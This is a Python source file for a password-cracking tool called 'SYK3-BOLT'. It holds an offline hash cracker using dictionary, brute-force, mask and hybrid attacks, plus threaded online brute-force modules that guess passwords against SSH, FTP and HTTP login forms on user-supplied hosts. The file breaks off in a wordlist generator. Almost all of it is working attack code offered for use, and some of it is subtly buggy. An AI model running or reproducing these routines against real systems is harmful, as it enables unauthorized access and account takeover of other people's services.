#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                      🦅 SYK3-BOLT v1.0.0 - Advanced                         ║
║                 Ultimate Cybersecurity & Cracking Framework                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  • 🔓 Password Cracking      • 💣 Hash Cracking       • 🎯 Wordlist Attacks  ║
║  • 🔐 SSH/RDP Cracking       • 📧 Email Cracking      • 🔑 WiFi Cracking     ║
║  • 🚀 Brute Force            • 📝 Dictionary Attacks  • 🎭 Social Engineering║
║  • 🕷️ Web Vulnerability      • 🔍 OSINT               • 📊 GPU Acceleration  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import hashlib
import base64
import binascii
import threading
import subprocess
import concurrent.futures
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, asdict
from pathlib import Path
import itertools
import string
import random
import socket
import requests
import re
import sqlite3
import datetime
import platform

# Try to import optional dependencies
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from Crypto.Cipher import AES, DES, ARC4
    from Crypto.Hash import MD5, SHA1, SHA256, SHA512
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import bcrypt
    BCRYPT_AVAILABLE = True
except ImportError:
    BCRYPT_AVAILABLE = False

try:
    import passlib.hash as ph
    PASSLIB_AVAILABLE = True
except ImportError:
    PASSLIB_AVAILABLE = False

try:
    import colorama
    from colorama import Fore, Back, Style, init
    colorama.init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

# Try to import GPU acceleration
try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

try:
    import cupy as cp
    CUDA_AVAILABLE = True
except ImportError:
    CUDA_AVAILABLE = False

# =====================
# COLOR THEME (Neon Green/Black - Hacker Theme)
# =====================
class Colors:
    """Neon green hacker theme colors"""
    if COLORS_AVAILABLE:
        GREEN = Fore.LIGHTGREEN_EX + Style.BRIGHT
        DARK_GREEN = Fore.GREEN + Style.BRIGHT
        NEON = Fore.GREEN + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
    else:
        GREEN = DARK_GREEN = NEON = CYAN = YELLOW = RED = MAGENTA = BLUE = WHITE = BLACK = BOLD = ""
        RESET = ""

# =====================
# DATA CLASSES
# =====================
@dataclass
class CrackingResult:
    """Result of a cracking attempt"""
    target: str
    password: str
    method: str
    time_taken: float
    attempts: int
    success: bool
    hash_type: Optional[str] = None
    error: Optional[str] = None

@dataclass
class HashInfo:
    """Information about a hash"""
    hash_string: str
    hash_type: str
    possible_algorithms: List[str]
    length: int
    is_valid: bool

@dataclass
class WordlistStats:
    """Wordlist statistics"""
    path: str
    total_lines: int
    unique_lines: int
    average_length: float
    min_length: int
    max_length: int
    common_patterns: Dict[str, int]

# =====================
# HASH DETECTOR
# =====================
class HashDetector:
    """Detect hash types based on format and length"""
    
    HASH_PATTERNS = {
        # MD5 family
        'md5': (32, r'^[a-fA-F0-9]{32}$'),
        'md4': (32, r'^[a-fA-F0-9]{32}$'),
        'md2': (32, r'^[a-fA-F0-9]{32}$'),
        
        # SHA family
        'sha1': (40, r'^[a-fA-F0-9]{40}$'),
        'sha224': (56, r'^[a-fA-F0-9]{56}$'),
        'sha256': (64, r'^[a-fA-F0-9]{64}$'),
        'sha384': (96, r'^[a-fA-F0-9]{96}$'),
        'sha512': (128, r'^[a-fA-F0-9]{128}$'),
        'sha3-224': (56, r'^[a-fA-F0-9]{56}$'),
        'sha3-256': (64, r'^[a-fA-F0-9]{64}$'),
        'sha3-384': (96, r'^[a-fA-F0-9]{96}$'),
        'sha3-512': (128, r'^[a-fA-F0-9]{128}$'),
        
        # MySQL
        'mysql': (16, r'^[a-fA-F0-9]{16}$'),
        'mysql5': (40, r'^[a-fA-F0-9]{40}$'),
        'mysql41': (40, r'^[a-fA-F0-9]{40}$'),
        
        # NTLM
        'ntlm': (32, r'^[a-fA-F0-9]{32}$'),
        
        # LM
        'lm': (32, r'^[a-fA-F0-9]{32}$'),
        
        # CRC32
        'crc32': (8, r'^[a-fA-F0-9]{8}$'),
        
        # Adler32
        'adler32': (8, r'^[a-fA-F0-9]{8}$'),
        
        # DES (Unix)
        'des': (13, r'^[./0-9A-Za-z]{13}$'),
        
        # MD5 Crypt (Unix)
        'md5_crypt': (34, r'^\$1\$[./0-9A-Za-z]{1,8}\$[./0-9A-Za-z]{22}$'),
        
        # SHA256 Crypt (Unix)
        'sha256_crypt': (63, r'^\$5\$[./0-9A-Za-z]{1,16}\$[./0-9A-Za-z]{43}$'),
        
        # SHA512 Crypt (Unix)
        'sha512_crypt': (106, r'^\$6\$[./0-9A-Za-z]{1,16}\$[./0-9A-Za-z]{86}$'),
        
        # bcrypt
        'bcrypt': (60, r'^\$2[aby]\$[0-9]{2}\$[./0-9A-Za-z]{53}$'),
        
        # PHPBB
        'phpbb3': (34, r'^\$H\$[./0-9A-Za-z]{31}$'),
        
        # WordPress
        'wordpress': (34, r'^\$P\$[./0-9A-Za-z]{31}$'),
        
        # Drupal
        'drupal7': (55, r'^\$S\$[./0-9A-Za-z]{52}$'),
        
        # Cisco Type 5
        'cisco5': (40, r'^[a-fA-F0-9]{40}$'),
        
        # Cisco Type 7
        'cisco7': (r'^[a-fA-F0-9]{4,}$'),
        
        # Joomla
        'joomla': (32, r'^[a-fA-F0-9]{32}:[a-zA-Z0-9]{16,32}$'),
        
        # PostgreSQL
        'postgres': (131, r'^md5[a-fA-F0-9]{32}$'),
        
        # Oracle 10g/11g
        'oracle': (40, r'^S:[A-F0-9]{40}$'),
        
        # MSSQL 2000
        'mssql2000': (94, r'^0x0100[A-F0-9]{88}$'),
        
        # MSSQL 2005
        'mssql2005': (94, r'^0x0100[A-F0-9]{88}$'),
        
        # MSSQL 2012
        'mssql2012': (120, r'^0x0200[A-F0-9]{116}$'),
        
        # OSX v10.7+
        'osx': (136, r'^[a-fA-F0-9]{136}$'),
        
        # Android PIN
        'android_pin': (40, r'^[a-fA-F0-9]{40}$'),
        
        # LDAP (MD5)
        'ldap_md5': (32, r'^\{MD5\}[a-fA-F0-9]{32}$'),
        
        # LDAP (SHA)
        'ldap_sha': (40, r'^\{SHA\}[a-fA-F0-9]{40}$'),
        
        # LDAP (SSHA)
        'ldap_ssha': (r'^\{SSHA\}[a-zA-Z0-9+/=]{32,}$'),
    }
    
    @classmethod
    def detect(cls, hash_string: str) -> HashInfo:
        """Detect possible hash types"""
        hash_string = hash_string.strip()
        length = len(hash_string)
        possible = []
        
        for algo, (expected_len, pattern) in cls.HASH_PATTERNS.items():
            if isinstance(expected_len, int):
                if length == expected_len:
                    if re.match(pattern, hash_string, re.IGNORECASE):
                        possible.append(algo)
            else:
                if re.match(pattern, hash_string, re.IGNORECASE):
                    possible.append(algo)
        
        # Add generic detections
        if length == 32 and re.match(r'^[a-fA-F0-9]{32}$', hash_string):
            possible.extend(['md5', 'ntlm', 'lm', 'mysql'])
        
        if length == 40 and re.match(r'^[a-fA-F0-9]{40}$', hash_string):
            possible.extend(['sha1', 'mysql5', 'mysql41', 'cisco5'])
        
        if length == 64 and re.match(r'^[a-fA-F0-9]{64}$', hash_string):
            possible.append('sha256')
        
        if length == 128 and re.match(r'^[a-fA-F0-9]{128}$', hash_string):
            possible.append('sha512')
        
        # Remove duplicates while preserving order
        seen = set()
        possible = [x for x in possible if not (x in seen or seen.add(x))]
        
        # Determine most likely type
        hash_type = possible[0] if possible else 'unknown'
        
        # Validate
        is_valid = any(re.match(pattern, hash_string, re.IGNORECASE) 
                      for pattern in cls.HASH_PATTERNS.values() 
                      if isinstance(pattern, str))
        
        return HashInfo(
            hash_string=hash_string,
            hash_type=hash_type,
            possible_algorithms=possible,
            length=length,
            is_valid=is_valid or bool(possible)
        )

# =====================
# PASSWORD CRACKER ENGINE
# =====================
class PasswordCracker:
    """Advanced password cracking engine with multiple attack methods"""
    
    def __init__(self, use_gpu: bool = False, threads: int = 4):
        self.use_gpu = use_gpu and CUDA_AVAILABLE
        self.threads = threads
        self.stats = {
            'attempts': 0,
            'start_time': None,
            'end_time': None,
            'found': False
        }
        self.wordlists_dir = "wordlists"
        Path(self.wordlists_dir).mkdir(exist_ok=True)
    
    def crack_hash(self, hash_string: str, method: str = 'dictionary', 
                   wordlist: str = None, min_len: int = 1, max_len: int = 8,
                   charset: str = None) -> CrackingResult:
        """Crack a hash using specified method"""
        start_time = time.time()
        hash_info = HashDetector.detect(hash_string)
        
        # Select attack method
        if method == 'dictionary':
            return self._dictionary_attack(hash_string, hash_info, wordlist, start_time)
        elif method == 'bruteforce':
            return self._bruteforce_attack(hash_string, hash_info, min_len, max_len, charset, start_time)
        elif method == 'mask':
            return self._mask_attack(hash_string, hash_info, start_time)
        elif method == 'hybrid':
            return self._hybrid_attack(hash_string, hash_info, wordlist, start_time)
        else:
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method=method,
                time_taken=0,
                attempts=0,
                success=False,
                error=f"Unknown method: {method}"
            )
    
    def _dictionary_attack(self, hash_string: str, hash_info: HashInfo, 
                           wordlist: str, start_time: float) -> CrackingResult:
        """Dictionary attack using wordlist"""
        attempts = 0
        
        # If no wordlist specified, use common wordlists
        if not wordlist:
            wordlist = self._get_default_wordlist()
        
        if not os.path.exists(wordlist):
            # Create a small default wordlist
            wordlist = self._create_default_wordlist()
        
        try:
            print(f"{Colors.NEON}[*] Starting dictionary attack with {wordlist}{Colors.RESET}")
            
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if not password:
                        continue
                    
                    attempts += 1
                    
                    # Try common hash algorithms
                    for algo in hash_info.possible_algorithms[:3]:  # Try top 3 likely algorithms
                        if self._verify_hash(password, hash_string, algo):
                            time_taken = time.time() - start_time
                            return CrackingResult(
                                target=hash_string[:16] + "...",
                                password=password,
                                method='dictionary',
                                time_taken=time_taken,
                                attempts=attempts,
                                success=True,
                                hash_type=algo
                            )
                    
                    # Show progress every 10000 attempts
                    if attempts % 10000 == 0:
                        print(f"{Colors.CYAN}[+] Attempts: {attempts:,} - Current: {password[:20]}{Colors.RESET}")
            
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='dictionary',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error="Password not found in dictionary"
            )
            
        except Exception as e:
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='dictionary',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error=str(e)
            )
    
    def _bruteforce_attack(self, hash_string: str, hash_info: HashInfo,
                          min_len: int, max_len: int, charset: str,
                          start_time: float) -> CrackingResult:
        """Brute force attack"""
        if not charset:
            # Default charset: alphanumeric + common symbols
            charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*"
        
        attempts = 0
        total_combinations = sum(len(charset) ** i for i in range(min_len, max_len + 1))
        
        print(f"{Colors.NEON}[*] Starting brute force attack{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Charset size: {len(charset)} characters{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Length range: {min_len}-{max_len}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Total combinations: {total_combinations:,}{Colors.RESET}")
        
        try:
            for length in range(min_len, max_len + 1):
                for attempt in itertools.product(charset, repeat=length):
                    password = ''.join(attempt)
                    attempts += 1
                    
                    # Try each possible algorithm
                    for algo in hash_info.possible_algorithms[:3]:
                        if self._verify_hash(password, hash_string, algo):
                            time_taken = time.time() - start_time
                            return CrackingResult(
                                target=hash_string[:16] + "...",
                                password=password,
                                method='bruteforce',
                                time_taken=time_taken,
                                attempts=attempts,
                                success=True,
                                hash_type=algo
                            )
                    
                    # Progress update
                    if attempts % 100000 == 0:
                        progress = (attempts / total_combinations) * 100
                        print(f"{Colors.CYAN}[+] Progress: {progress:.4f}% - Attempts: {attempts:,}{Colors.RESET}")
            
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='bruteforce',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error="Brute force exhausted"
            )
            
        except Exception as e:
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='bruteforce',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error=str(e)
            )
    
    def _mask_attack(self, hash_string: str, hash_info: HashInfo, 
                    start_time: float) -> CrackingResult:
        """Mask attack for known patterns"""
        masks = [
            "?l?l?l?l",           # 4 lowercase
            "?l?l?l?l?l",          # 5 lowercase
            "?l?l?l?l?l?l",        # 6 lowercase
            "?l?l?l?l?l?l?l",      # 7 lowercase
            "?l?l?l?l?l?l?l?l",    # 8 lowercase
            "?u?l?l?l?l?l",        # Capital + lowercase
            "?d?d?d?d",            # 4 digits
            "?d?d?d?d?d?d",        # 6 digits
            "?l?l?l?d?d?d",        # 3 letters + 3 digits
            "?u?l?l?l?d?d?d",      # Capital + 2 letters + 3 digits
            "?l?l?l?l?l?s",        # 5 letters + symbol
        ]
        
        charset_map = {
            '?l': string.ascii_lowercase,
            '?u': string.ascii_uppercase,
            '?d': string.digits,
            '?s': '!@#$%^&*()_+-=[]{}|;:,.<>?',
            '?a': string.ascii_letters + string.digits + '!@#$%^&*()_+-=[]{}|;:,.<>?'
        }
        
        attempts = 0
        
        print(f"{Colors.NEON}[*] Starting mask attack with {len(masks)} patterns{Colors.RESET}")
        
        try:
            for mask in masks:
                # Parse mask
                charsets = []
                mask_len = 0
                i = 0
                while i < len(mask):
                    if mask[i] == '?' and i + 1 < len(mask):
                        charsets.append(charset_map.get(mask[i:i+2], '?'))
                        mask_len += 1
                        i += 2
                    else:
                        charsets.append(mask[i])
                        mask_len += 1
                        i += 1
                
                print(f"{Colors.CYAN}[*] Trying mask: {mask}{Colors.RESET}")
                
                # Generate combinations
                for combination in itertools.product(*charsets):
                    password = ''.join(combination)
                    attempts += 1
                    
                    for algo in hash_info.possible_algorithms[:3]:
                        if self._verify_hash(password, hash_string, algo):
                            time_taken = time.time() - start_time
                            return CrackingResult(
                                target=hash_string[:16] + "...",
                                password=password,
                                method='mask',
                                time_taken=time_taken,
                                attempts=attempts,
                                success=True,
                                hash_type=algo
                            )
            
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='mask',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error="No matching mask found"
            )
            
        except Exception as e:
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='mask',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error=str(e)
            )
    
    def _hybrid_attack(self, hash_string: str, hash_info: HashInfo,
                      wordlist: str, start_time: float) -> CrackingResult:
        """Hybrid attack combining dictionary with mutations"""
        attempts = 0
        
        if not wordlist:
            wordlist = self._get_default_wordlist()
        
        mutations = [
            lambda s: s,
            lambda s: s.capitalize(),
            lambda s: s.upper(),
            lambda s: s + '123',
            lambda s: s + '!',
            lambda s: s + '@',
            lambda s: s + '#',
            lambda s: s + '2023',
            lambda s: s + '2024',
            lambda s: '!' + s,
            lambda s: '@' + s,
            lambda s: '#' + s,
            lambda s: s[::-1],  # Reverse
            lambda s: s + s,     # Double
            lambda s: s[:1].upper() + s[1:],  # Capitalize first
            lambda s: s.replace('a', '@').replace('e', '3').replace('i', '1'),
            lambda s: s.replace('o', '0').replace('s', '$'),
        ]
        
        print(f"{Colors.NEON}[*] Starting hybrid attack with {len(mutations)} mutations{Colors.RESET}")
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            
            for word in words:
                for mutation in mutations:
                    try:
                        password = mutation(word)
                        if len(password) > 32:  # Skip too long passwords
                            continue
                        
                        attempts += 1
                        
                        for algo in hash_info.possible_algorithms[:3]:
                            if self._verify_hash(password, hash_string, algo):
                                time_taken = time.time() - start_time
                                return CrackingResult(
                                    target=hash_string[:16] + "...",
                                    password=password,
                                    method='hybrid',
                                    time_taken=time_taken,
                                    attempts=attempts,
                                    success=True,
                                    hash_type=algo
                                )
                        
                        if attempts % 10000 == 0:
                            print(f"{Colors.CYAN}[+] Attempts: {attempts:,}{Colors.RESET}")
                            
                    except Exception:
                        continue
            
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='hybrid',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error="Hybrid attack failed"
            )
            
        except Exception as e:
            time_taken = time.time() - start_time
            return CrackingResult(
                target=hash_string[:16] + "...",
                password="",
                method='hybrid',
                time_taken=time_taken,
                attempts=attempts,
                success=False,
                error=str(e)
            )
    
    def _verify_hash(self, password: str, target_hash: str, algorithm: str) -> bool:
        """Verify if password matches hash"""
        try:
            if algorithm in ['md5', 'md4', 'md2']:
                return hashlib.md5(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['sha1']:
                return hashlib.sha1(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['sha224']:
                return hashlib.sha224(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['sha256']:
                return hashlib.sha256(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['sha384']:
                return hashlib.sha384(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['sha512']:
                return hashlib.sha512(password.encode()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['ntlm'] and CRYPTO_AVAILABLE:
                # NTLM hash
                import hashlib
                hash_obj = hashlib.new('md4', password.encode('utf-16le')).digest()
                return binascii.hexlify(hash_obj).decode() == target_hash.lower()
            
            elif algorithm in ['mysql']:
                # MySQL old password hash
                hash_val = 0
                for c in password:
                    hash_val = ((hash_val << 4) + ord(c)) & 0x3FFFFFFF
                return format(hash_val, '08x') == target_hash.lower()
            
            elif algorithm in ['mysql5', 'mysql41']:
                return hashlib.sha1(hashlib.sha1(password.encode()).digest()).hexdigest() == target_hash.lower()
            
            elif algorithm in ['bcrypt'] and BCRYPT_AVAILABLE:
                return bcrypt.checkpw(password.encode(), target_hash.encode())
            
            elif algorithm in ['md5_crypt', 'sha256_crypt', 'sha512_crypt'] and PASSLIB_AVAILABLE:
                if algorithm == 'md5_crypt':
                    return ph.md5_crypt.verify(password, target_hash)
                elif algorithm == 'sha256_crypt':
                    return ph.sha256_crypt.verify(password, target_hash)
                elif algorithm == 'sha512_crypt':
                    return ph.sha512_crypt.verify(password, target_hash)
            
            return False
            
        except Exception:
            return False
    
    def _get_default_wordlist(self) -> str:
        """Get default wordlist path"""
        common_paths = [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/rockyou.txt.gz',
            '/usr/share/wordlists/fasttrack.txt',
            '/usr/share/wordlists/fern-wifi/common.txt',
            '/usr/share/dict/words',
            '/usr/dict/words'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return 'wordlists/default.txt'
    
    def _create_default_wordlist(self) -> str:
        """Create a small default wordlist"""
        default_path = 'wordlists/default.txt'
        
        if os.path.exists(default_path):
            return default_path
        
        print(f"{Colors.YELLOW}[*] Creating default wordlist...{Colors.RESET}")
        
        common_passwords = [
            'password', '123456', '12345678', '1234', 'qwerty', 'abc123',
            'password1', 'admin', 'letmein', 'welcome', 'monkey', 'sunshine',
            'master', 'dragon', 'football', 'baseball', 'superman', 'iloveyou',
            'trustno1', 'shadow', 'ashley', 'bailey', 'passw0rd', 'starwars',
            'buster', 'chester', 'tigger', 'robert', 'matthew', 'jordan',
            'jordan23', 'michael', 'michelle', 'jessica', 'ashley', 'charlie',
            'samantha', 'daniel', 'thomas', 'andrew', 'joseph', 'christopher',
            'anthony', 'john', 'william', 'david', 'richard', 'charles',
            'thomas', 'christopher', 'daniel', 'matthew', 'anthony', 'donald',
            'mark', 'paul', 'steven', 'andrew', 'kenneth', 'george', 'joshua',
            'kevin', 'brian', 'edward', 'ronald', 'timothy', 'jason', 'jeffrey',
            'ryan', 'jacob', 'gary', 'nicholas', 'eric', 'jonathan', 'stephen',
            'larry', 'justin', 'scott', 'brandon', 'benjamin', 'samuel',
            'gregory', 'alexander', 'frank', 'patrick', 'raymond', 'jack',
            'dennis', 'jerry', 'tyler', 'aaron', 'jose', 'adam', 'nathan',
            'henry', 'zachary', 'douglas', 'peter', 'kyle', 'noah', 'ethan',
            'jeremy', 'christian', 'walter', 'keith', 'austin', 'sean',
        ]
        
        with open(default_path, 'w') as f:
            for password in common_passwords:
                f.write(password + '\n')
        
        print(f"{Colors.GREEN}[+] Default wordlist created: {default_path}{Colors.RESET}")
        return default_path

# =====================
# SSH CRACKER
# =====================
class SSHCracker:
    """SSH brute force cracking"""
    
    def __init__(self, threads: int = 5):
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
    
    def crack(self, host: str, port: int, username: str, 
              wordlist: str, timeout: int = 5) -> List[CrackingResult]:
        """Crack SSH password using wordlist"""
        results = []
        
        if not PARAMIKO_AVAILABLE:
            print(f"{Colors.RED}[!] Paramiko not available. Install: pip install paramiko{Colors.RESET}")
            return results
        
        if not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.RESET}")
            return results
        
        # Load passwords
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.RESET}")
            return results
        
        print(f"{Colors.NEON}[*] Starting SSH crack on {host}:{port} for user '{username}'{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Loaded {len(passwords):,} passwords{Colors.RESET}")
        
        start_time = time.time()
        
        # Use thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for password in passwords:
                future = executor.submit(
                    self._try_ssh_password, 
                    host, port, username, password, timeout
                )
                futures.append(future)
            
            # Process results as they complete
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                result = future.result()
                if result:
                    with self.lock:
                        results.append(result)
                    
                    if result.success:
                        # Stop if password found
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                
                # Progress update
                if (i + 1) % 100 == 0:
                    progress = ((i + 1) / len(passwords)) * 100
                    print(f"{Colors.CYAN}[+] Progress: {progress:.1f}% ({i+1}/{len(passwords)}){Colors.RESET}")
        
        time_taken = time.time() - start_time
        
        if results:
            print(f"{Colors.GREEN}[+] Password found: {results[0].password}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[-] Password not found{Colors.RESET}")
        
        print(f"{Colors.CYAN}[*] Time taken: {time_taken:.2f}s{Colors.RESET}")
        
        return results
    
    def _try_ssh_password(self, host: str, port: int, username: str, 
                          password: str, timeout: int) -> Optional[CrackingResult]:
        """Try a single SSH password"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                banner_timeout=timeout,
                auth_timeout=timeout
            )
            client.close()
            
            return CrackingResult(
                target=f"{username}@{host}:{port}",
                password=password,
                method='ssh_bruteforce',
                time_taken=0,
                attempts=0,
                success=True
            )
            
        except paramiko.AuthenticationException:
            return None
        except Exception as e:
            # Connection error - might be rate limiting or network issue
            time.sleep(1)
            return None

# =====================
# FTP CRACKER
# =====================
class FTPCracker:
    """FTP brute force cracking"""
    
    def __init__(self, threads: int = 10):
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
    
    def crack(self, host: str, port: int, username: str, 
              wordlist: str, timeout: int = 5) -> List[CrackingResult]:
        """Crack FTP password using wordlist"""
        import ftplib
        
        results = []
        
        if not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.RESET}")
            return results
        
        # Load passwords
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.RESET}")
            return results
        
        print(f"{Colors.NEON}[*] Starting FTP crack on {host}:{port} for user '{username}'{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Loaded {len(passwords):,} passwords{Colors.RESET}")
        
        start_time = time.time()
        
        # Use thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for password in passwords:
                future = executor.submit(
                    self._try_ftp_password,
                    host, port, username, password, timeout
                )
                futures.append(future)
            
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                result = future.result()
                if result:
                    with self.lock:
                        results.append(result)
                    
                    if result.success:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                
                if (i + 1) % 100 == 0:
                    progress = ((i + 1) / len(passwords)) * 100
                    print(f"{Colors.CYAN}[+] Progress: {progress:.1f}% ({i+1}/{len(passwords)}){Colors.RESET}")
        
        time_taken = time.time() - start_time
        
        if results:
            print(f"{Colors.GREEN}[+] Password found: {results[0].password}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[-] Password not found{Colors.RESET}")
        
        print(f"{Colors.CYAN}[*] Time taken: {time_taken:.2f}s{Colors.RESET}")
        
        return results
    
    def _try_ftp_password(self, host: str, port: int, username: str,
                         password: str, timeout: int) -> Optional[CrackingResult]:
        """Try a single FTP password"""
        import ftplib
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password)
            ftp.quit()
            
            return CrackingResult(
                target=f"{username}@{host}:{port}",
                password=password,
                method='ftp_bruteforce',
                time_taken=0,
                attempts=0,
                success=True
            )
            
        except ftplib.error_perm:
            return None
        except Exception:
            return None

# =====================
# HTTP FORM CRACKER
# =====================
class HTTPCracker:
    """HTTP form-based authentication cracking"""
    
    def __init__(self, threads: int = 5):
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
    
    def crack(self, url: str, username_field: str, password_field: str,
              username: str, wordlist: str, error_message: str = None,
              method: str = 'POST', additional_data: Dict = None) -> List[CrackingResult]:
        """Crack HTTP form authentication"""
        results = []
        
        if not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.RESET}")
            return results
        
        # Load passwords
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.RESET}")
            return results
        
        print(f"{Colors.NEON}[*] Starting HTTP crack on {url}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Loaded {len(passwords):,} passwords{Colors.RESET}")
        
        start_time = time.time()
        
        # Use thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for password in passwords:
                future = executor.submit(
                    self._try_http_password,
                    url, username_field, password_field, username,
                    password, error_message, method, additional_data
                )
                futures.append(future)
            
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                result = future.result()
                if result:
                    with self.lock:
                        results.append(result)
                    
                    if result.success:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                
                if (i + 1) % 100 == 0:
                    progress = ((i + 1) / len(passwords)) * 100
                    print(f"{Colors.CYAN}[+] Progress: {progress:.1f}% ({i+1}/{len(passwords)}){Colors.RESET}")
        
        time_taken = time.time() - start_time
        
        if results:
            print(f"{Colors.GREEN}[+] Password found: {results[0].password}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[-] Password not found{Colors.RESET}")
        
        print(f"{Colors.CYAN}[*] Time taken: {time_taken:.2f}s{Colors.RESET}")
        
        return results
    
    def _try_http_password(self, url: str, username_field: str, password_field: str,
                          username: str, password: str, error_message: str,
                          method: str, additional_data: Dict) -> Optional[CrackingResult]:
        """Try a single HTTP password"""
        try:
            data = {
                username_field: username,
                password_field: password
            }
            
            if additional_data:
                data.update(additional_data)
            
            if method.upper() == 'POST':
                response = requests.post(url, data=data, timeout=5)
            else:
                response = requests.get(url, params=data, timeout=5)
            
            # Check for success
            if error_message:
                if error_message not in response.text:
                    return CrackingResult(
                        target=url,
                        password=password,
                        method='http_bruteforce',
                        time_taken=0,
                        attempts=0,
                        success=True
                    )
            else:
                # Default success indicators
                if response.status_code == 200 and 'login' not in response.url.lower():
                    return CrackingResult(
                        target=url,
                        password=password,
                        method='http_bruteforce',
                        time_taken=0,
                        attempts=0,
                        success=True
                    )
            
            return None
            
        except Exception:
            return None

# =====================
# WORDLIST GENERATOR
# =====================
class WordlistGenerator:
    """Generate custom wordlists based on target information"""
    
    @staticmethod
    def generate_from_keywords(keywords: List[str], output_file: str,
                               min_len: int = 4, max_len: int = 16,
                               include_numbers: bool = True,
                               include_special: bool = True,
                               leet_speak: bool = True) -> WordlistStats:
        """Generate wordlist from keywords"""
        words = set()
        
        # Add base keywords
        for keyword in keywords:
            words.add(keyword)
            words.add(keyword.lower())
            words.add(keyword.upper())
            words.add(keyword.capitalize())
        
        # Add combinations
        for k1 in keywords:
            for k2 in keywords:
                if k1 != k2:
                    words.add(k1 + k2)
                    words.add(k1 + '@' + k2)
                    words.add(k1 + '#' + k2)
        
        # Add with numbers
        if include_numbers:
            for word in list(words):
